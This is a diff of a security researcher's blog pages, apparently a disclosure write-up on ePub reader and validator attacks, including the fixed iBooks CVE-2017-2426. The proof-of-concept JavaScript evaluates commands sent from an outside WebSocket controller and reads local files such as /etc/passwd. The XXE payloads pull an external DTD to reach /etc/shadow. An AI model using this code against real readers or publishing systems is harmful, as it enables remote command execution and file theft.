@@ -11,8 +11,16 @@
 ">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://s1gnalcha0s.github.io/">
-  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://s1gnalcha0s.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://localhost:4000/feed.xml" />
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: "ca-pub-2306194403955793",
+      enable_page_level_ads: true
+    });
+  </script>
 </head>
 
 
@@ -78,7 +86,7 @@
   <p>“Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman</p>
 </blockquote>
 
-<p>On a previous post about ePub parsers (<a href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>), I mentioned using scripting capabilities in ePub to perform local attacks against users. </p>
+<p>On a previous post about ePub parsers (<a href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>), I mentioned using scripting capabilities in ePub to perform local attacks against users.</p>
 
 <p>Apple just released a fix for one issue I reported last year in iBooks that allowed access to files on a users system when a book was opened. iBooks on El Capitan would open an ePub using the file:// origin, which would allow an attacker to access the users file system when they opened a book. (<a href="https://support.apple.com/en-us/HT207615">CVE-2017-2426</a>)</p>
 
@@ -97,7 +105,7 @@
 
 <p><iframe src="https://player.vimeo.com/video/210000247" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p>
 
-<p>This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions. </p>
+<p>This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions.</p>
 
 <p><a href="/assets/controller/POC.epub"><img src="/assets/ibooks/ibooksico.png" alt="Image" /></a></p>
 
@@ -114,37 +122,37 @@
   </li>
 </ul>
 
-<p>eg., contents of poc.epub/EPUB/js/main.js </p>
+<p>eg., contents of poc.epub/EPUB/js/main.js</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">WebSocketController</span> <span class="o">=</span> <span class="s1">&#39;ws://websocket-controller.herokuapp.com:80&#39;</span><span class="p">;</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">WebSocketController</span> <span class="o">=</span> <span class="s1">'ws://websocket-controller.herokuapp.com:80'</span><span class="p">;</span>
 
-<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">WebSocketController</span><span class="p">,</span> <span class="s1">&#39;echo-protocol&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">WebSocketController</span><span class="p">,</span> <span class="s1">'echo-protocol'</span><span class="p">);</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onopen</span><span class="p">()</span> <span class="p">};</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">};</span>
 <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onerror</span><span class="p">()</span> <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onopen</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Connected to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">'Connected to WebSocket Controller: '</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onerror</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Unable to connect to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">'Unable to connect to WebSocket Controller: '</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="c1">//just eval anything sent from the controller</span>
-  <span class="nx">response</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+  <span class="nx">response</span> <span class="o">=</span> <span class="kr">eval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
 
   <span class="c1">//send response back to controller</span>
   <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="kd">function</span> <span class="nx">get</span><span class="p">(</span><span class="nx">loc</span><span class="p">)</span> <span class="p">{</span>
+<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">loc</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;file://&#39;</span> <span class="o">+</span> <span class="nx">loc</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'file://'</span> <span class="o">+</span> <span class="nx">loc</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
   <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
   
   <span class="c1">//populate the message element</span>
@@ -154,13 +162,13 @@
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">message</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"message"</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
   <span class="k">return</span> <span class="nx">message</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="kd">function</span> <span class="nx">showExfil</span><span class="p">()</span> <span class="p">{</span>
-  <span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
-<span class="p">}</span></code></pre></div>
+  <span class="kd">get</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
 
 <ul>
   <li><strong>zip -r poc.epub *</strong></li>
@@ -184,11 +192,11 @@
 <p>Shoutouts:</p>
 
 <p><a href="https://twitter.com/shhnjk">@shhnjk</a> reported CVE-2017-2426 as well around the same time 👍. 
-<br /><a href="https://twitter.com/mccabe615">@mccabe615</a> ran a POC to help me confirm some issues independently. </p>
+<br /><a href="https://twitter.com/mccabe615">@mccabe615</a> ran a POC to help me confirm some issues independently.</p>
 
-<p>Thanks for reading. 👋 </p>
+<p>Thanks for reading. 👋</p>
 
-<p><a href="https://twitter.com/craig_arendt">@craig</a></p>
+<p><a href="https://twitter.com/signalchaos">@craig</a></p>
 
         </article>
 
@@ -217,54 +225,54 @@
 
 <p>eg., epub archive:</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">Archive</span><span class="o">:</span>  <span class="nx">book</span><span class="p">.</span><span class="nx">epub</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">Archive</span><span class="p">:</span>  <span class="nx">book</span><span class="p">.</span><span class="nx">epub</span>
   <span class="nx">Length</span>      <span class="nb">Date</span>    <span class="nx">Time</span>    <span class="nx">Name</span>
 <span class="o">---------</span>  <span class="o">----------</span> <span class="o">-----</span>   <span class="o">----</span>
-       <span class="mi">20</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">mimetype</span>
-     <span class="mi">2189</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">toc</span><span class="p">.</span><span class="nx">ncx</span>
-    <span class="mi">39962</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">001</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">i</span><span class="p">.</span><span class="nx">html</span>
-    <span class="mi">41745</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">002</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">ii</span><span class="p">.</span><span class="nx">html</span>
-      <span class="mi">684</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">title</span><span class="o">-</span><span class="nx">page</span><span class="p">.</span><span class="nx">html</span>
-      <span class="mi">557</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">front</span><span class="o">-</span><span class="nx">cover</span><span class="p">.</span><span class="nx">html</span>
-    <span class="mi">42220</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">003</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">iii</span><span class="p">.</span><span class="nx">html</span>
-     <span class="mi">1185</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">copyright</span><span class="p">.</span><span class="nx">html</span>
-      <span class="mi">884</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">table</span><span class="o">-</span><span class="nx">of</span><span class="o">-</span><span class="nx">contents</span><span class="p">.</span><span class="nx">html</span>
-   <span class="mi">234790</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">pressbooks</span><span class="o">-</span><span class="nx">promo</span><span class="p">.</span><span class="nx">png</span>
-    <span class="mi">33684</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">MedulaOne</span><span class="o">-</span><span class="nx">Regular</span><span class="p">.</span><span class="nx">ttf</span>
-   <span class="mi">244146</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">themetamorphosis_1200x1600</span><span class="p">.</span><span class="nx">jpg</span>
-      <span class="mi">661</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">pressbooks</span><span class="o">-</span><span class="nx">promo</span><span class="p">.</span><span class="nx">html</span>
-    <span class="mi">27328</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">jackson</span><span class="p">.</span><span class="nx">css</span>
-     <span class="mi">3494</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">book</span><span class="p">.</span><span class="nx">opf</span>
-      <span class="mi">240</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">META</span><span class="o">-</span><span class="nx">INF</span><span class="o">/</span><span class="nx">container</span><span class="p">.</span><span class="nx">xml</span>
-      <span class="mi">157</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="o">:</span><span class="mi">41</span>   <span class="nx">META</span><span class="o">-</span><span class="nx">INF</span><span class="o">/</span><span class="nx">com</span><span class="p">.</span><span class="nx">apple</span><span class="p">.</span><span class="nx">ibooks</span><span class="p">.</span><span class="nx">display</span><span class="o">-</span><span class="nx">options</span><span class="p">.</span><span class="nx">xml</span>
+       <span class="mi">20</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">mimetype</span>
+     <span class="mi">2189</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">toc</span><span class="p">.</span><span class="nx">ncx</span>
+    <span class="mi">39962</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">001</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">i</span><span class="p">.</span><span class="nx">html</span>
+    <span class="mi">41745</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">002</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">ii</span><span class="p">.</span><span class="nx">html</span>
+      <span class="mi">684</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">title</span><span class="o">-</span><span class="nx">page</span><span class="p">.</span><span class="nx">html</span>
+      <span class="mi">557</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">front</span><span class="o">-</span><span class="nx">cover</span><span class="p">.</span><span class="nx">html</span>
+    <span class="mi">42220</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">chapter</span><span class="o">-</span><span class="mi">003</span><span class="o">-</span><span class="nx">chapter</span><span class="o">-</span><span class="nx">iii</span><span class="p">.</span><span class="nx">html</span>
+     <span class="mi">1185</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">copyright</span><span class="p">.</span><span class="nx">html</span>
+      <span class="mi">884</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">table</span><span class="o">-</span><span class="k">of</span><span class="o">-</span><span class="nx">contents</span><span class="p">.</span><span class="nx">html</span>
+   <span class="mi">234790</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">pressbooks</span><span class="o">-</span><span class="nx">promo</span><span class="p">.</span><span class="nx">png</span>
+    <span class="mi">33684</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">MedulaOne</span><span class="o">-</span><span class="nx">Regular</span><span class="p">.</span><span class="nx">ttf</span>
+   <span class="mi">244146</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">themetamorphosis_1200x1600</span><span class="p">.</span><span class="nx">jpg</span>
+      <span class="mi">661</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">pressbooks</span><span class="o">-</span><span class="nx">promo</span><span class="p">.</span><span class="nx">html</span>
+    <span class="mi">27328</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">OEBPS</span><span class="o">/</span><span class="nx">jackson</span><span class="p">.</span><span class="nx">css</span>
+     <span class="mi">3494</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">book</span><span class="p">.</span><span class="nx">opf</span>
+      <span class="mi">240</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">META</span><span class="o">-</span><span class="nx">INF</span><span class="o">/</span><span class="nx">container</span><span class="p">.</span><span class="nx">xml</span>
+      <span class="mi">157</span>  <span class="mi">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="nx">META</span><span class="o">-</span><span class="nx">INF</span><span class="o">/</span><span class="nx">com</span><span class="p">.</span><span class="nx">apple</span><span class="p">.</span><span class="nx">ibooks</span><span class="p">.</span><span class="nx">display</span><span class="o">-</span><span class="nx">options</span><span class="p">.</span><span class="nx">xml</span>
 <span class="o">---------</span>                     <span class="o">-------</span>
-   <span class="mi">673946</span>                     <span class="mi">17</span> <span class="nx">files</span></code></pre></div>
+   <span class="mi">673946</span>                     <span class="mi">17</span> <span class="nx">files</span></code></pre></figure>
 
 <p>eg., contents of META-INF/container.xml</p>
 
-<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span class="nt">&lt;container</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span> <span class="na">xmlns=</span><span class="s">&quot;urn:oasis:names:tc:opendocument:xmlns:container&quot;</span><span class="nt">&gt;</span>
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;container</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns=</span><span class="s">"urn:oasis:names:tc:opendocument:xmlns:container"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;rootfiles&gt;</span>
- <span class="nt">&lt;rootfile</span> <span class="na">full-path=</span><span class="s">&quot;OEBPS/book.opf&quot;</span>
- <span class="na">media-type=</span><span class="s">&quot;application/oebps-package+xml&quot;</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;rootfile</span> <span class="na">full-path=</span><span class="s">"OEBPS/book.opf"</span>
+ <span class="na">media-type=</span><span class="s">"application/oebps-package+xml"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/rootfiles&gt;</span>
-<span class="nt">&lt;/container&gt;</span></code></pre></div>
+<span class="nt">&lt;/container&gt;</span></code></pre></figure>
 
 <p>eg., contents of book.opf</p>
 
-<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
-    <span class="nt">&lt;package</span> <span class="na">version=</span><span class="s">&quot;2.0&quot;</span> <span class="na">xmlns=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span> <span class="na">unique-identifier=</span><span class="s">&quot;PrimaryID&quot;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;metadata</span> <span class="na">xmlns:dc=</span><span class="s">&quot;http://purl.org/dc/elements/1.1/&quot;</span> <span class="na">xmlns:opf=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span><span class="nt">&gt;</span>
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+    <span class="nt">&lt;package</span> <span class="na">version=</span><span class="s">"2.0"</span> <span class="na">xmlns=</span><span class="s">"http://www.idpf.org/2007/opf"</span> <span class="na">unique-identifier=</span><span class="s">"PrimaryID"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;metadata</span> <span class="na">xmlns:dc=</span><span class="s">"http://purl.org/dc/elements/1.1/"</span> <span class="na">xmlns:opf=</span><span class="s">"http://www.idpf.org/2007/opf"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;dc:title&gt;</span>My Book <span class="nt">&lt;/dc:title&gt;</span>
     <span class="nt">&lt;dc:language&gt;</span>en<span class="nt">&lt;/dc:language&gt;</span>
-    <span class="nt">&lt;dc:identifier</span> <span class="na">id=</span><span class="s">&quot;PrimaryID&quot;</span> <span class="na">opf:scheme=</span><span class="s">&quot;URI&quot;</span><span class="nt">&gt;</span>http://mybook.com<span class="nt">&lt;/dc:identifier&gt;</span>
+    <span class="nt">&lt;dc:identifier</span> <span class="na">id=</span><span class="s">"PrimaryID"</span> <span class="na">opf:scheme=</span><span class="s">"URI"</span><span class="nt">&gt;</span>http://mybook.com<span class="nt">&lt;/dc:identifier&gt;</span>
     <span class="nt">&lt;dc:description&gt;</span>Description<span class="nt">&lt;/dc:description&gt;</span>
-    <span class="nt">&lt;dc:creator</span> <span class="na">opf:role=</span><span class="s">&quot;aut&quot;</span><span class="nt">&gt;</span>Author<span class="nt">&lt;/dc:creator&gt;</span>
+    <span class="nt">&lt;dc:creator</span> <span class="na">opf:role=</span><span class="s">"aut"</span><span class="nt">&gt;</span>Author<span class="nt">&lt;/dc:creator&gt;</span>
     <span class="nt">&lt;dc:publisher&gt;</span>Publisher.com<span class="nt">&lt;/dc:publisher&gt;</span>
-    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;cover&quot;</span> <span class="na">content=</span><span class="s">&quot;cover-image&quot;</span> <span class="nt">/&gt;</span>
-<span class="nt">&lt;/metadata&gt;</span></code></pre></div>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"cover"</span> <span class="na">content=</span><span class="s">"cover-image"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/metadata&gt;</span></code></pre></figure>
 
-<p>When I first started looking into this, I learned about a tool/Java library called <a href="https://github.com/IDPF/epubcheck/releases">EpubCheck</a> (provided by IDPF) that is used to validate books in the ePub format. Book publishers tend to perform a validation step using something like this to check the format validity. The validator tool/library was vulnerable to XXE, so any application that relies on a vulnerable version to check the validity of a book would be susceptible to this type of attack. </p>
+<p>When I first started looking into this, I learned about a tool/Java library called <a href="https://github.com/IDPF/epubcheck/releases">EpubCheck</a> (provided by IDPF) that is used to validate books in the ePub format. Book publishers tend to perform a validation step using something like this to check the format validity. The validator tool/library was vulnerable to XXE, so any application that relies on a vulnerable version to check the validity of a book would be susceptible to this type of attack.</p>
 
 <h4 id="modifying-an-existing-epub-file-to-test-for-xml-parsing-vulnerabilities">Modifying an existing ePub file to test for XML parsing vulnerabilities:</h4>
 
@@ -276,19 +284,19 @@
     <p><strong>unzip book.epub; rm book.epub</strong></p>
   </li>
   <li>
-    <p><strong>Edit any of the files that contain XML metadata.</strong> </p>
+    <p><strong>Edit any of the files that contain XML metadata.</strong></p>
   </li>
 </ul>
 
 <p>eg., book.opf  (XXE - XML External Entities pattern)</p>
 
-<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
-<span class="cp">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM &quot;http://123.123.123.123/dtd&quot;&gt;</span>%b;%c;]&gt;<span class="nt">&lt;package</span> <span class="na">version=</span><span class="s">&quot;2.0&quot;</span> <span class="na">xmlns=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span> <span class="na">unique-identifier=</span><span class="s">&quot;PrimaryID&quot;</span><span class="nt">&gt;</span>
-<span class="nt">&lt;metadata</span> <span class="na">xmlns:dc=</span><span class="s">&quot;http://purl.org/dc/elements/1.1/&quot;</span> <span class="na">xmlns:opf=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span><span class="nt">&gt;</span>
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+<span class="cp">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM "http://123.123.123.123/dtd"&gt;</span>%b;%c;]&gt;<span class="nt">&lt;package</span> <span class="na">version=</span><span class="s">"2.0"</span> <span class="na">xmlns=</span><span class="s">"http://www.idpf.org/2007/opf"</span> <span class="na">unique-identifier=</span><span class="s">"PrimaryID"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;metadata</span> <span class="na">xmlns:dc=</span><span class="s">"http://purl.org/dc/elements/1.1/"</span> <span class="na">xmlns:opf=</span><span class="s">"http://www.idpf.org/2007/opf"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;dc:title&gt;</span>Metamorphosis<span class="nt">&lt;/dc:title&gt;</span>
 <span class="nt">&lt;dc:language&gt;</span>en<span class="nt">&lt;/dc:language&gt;</span>
-<span class="nt">&lt;dc:identifier</span> <span class="na">id=</span><span class="s">&quot;PrimaryID&quot;</span> <span class="na">opf:scheme=</span><span class="s">&quot;URI&quot;</span><span class="nt">&gt;</span>http://metamorphosiskafka.pressbooks.com<span class="nt">&lt;/dc:identifier&gt;</span>
-<span class="nt">&lt;dc:description&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/dc:description&gt;</span></code></pre></div>
+<span class="nt">&lt;dc:identifier</span> <span class="na">id=</span><span class="s">"PrimaryID"</span> <span class="na">opf:scheme=</span><span class="s">"URI"</span><span class="nt">&gt;</span>http://metamorphosiskafka.pressbooks.com<span class="nt">&lt;/dc:identifier&gt;</span>
+<span class="nt">&lt;dc:description&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/dc:description&gt;</span></code></pre></figure>
 
 <ul>
   <li>
@@ -299,12 +307,12 @@
   </li>
 </ul>
 
-<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % d SYSTEM &quot;file:///etc/shadow&quot;&gt;</span>
